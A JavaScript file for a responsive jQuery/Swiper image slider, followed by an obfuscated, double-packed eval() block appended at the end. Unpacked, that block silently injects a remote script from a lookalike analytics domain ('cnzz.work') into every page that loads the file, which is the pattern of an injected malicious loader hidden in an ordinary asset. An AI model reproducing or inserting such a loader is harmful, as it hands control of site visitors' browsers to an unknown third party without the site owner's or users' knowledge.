$(function(){
	if ($(".flash").length){
		//获取图片数量
		var auto_num = $(".ul_flash img").length;
		var auto_width = $(".flash").width();
		var auto_height = 420;
		//插入数字番号列表，并为首个列表单元添加样式
		$(".flash").addClass("swiper-container").append("<div class='pagination'></div>");
		$(".ul_flash").addClass("swiper-wrapper").find("li").addClass("swiper-slide");
		function flash(){
			//获取图片高度
			if (document.documentElement.clientWidth>=640){
				auto_width = 640;
				auto_height = 420;
			}
			else{
				auto_width = document.documentElement.clientWidth;
				auto_height = 420 * auto_width / 640;
			}
			$(".flash").width(auto_width).height(auto_height);
			$(".ul_flash li").width(auto_width);
			$(".ul_flash").width(auto_width*auto_num).height(auto_height);
		}
		flash();
		$(window).resize(function(){flash()});
		var mySwiper = $('.swiper-container').swiper({
			pagination: '.pagination',
			mode:'horizontal',
			loop: true,
			autoplay:6000
		})
		//$(".pagination span").width(100/auto_num+"%");
	}
});
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))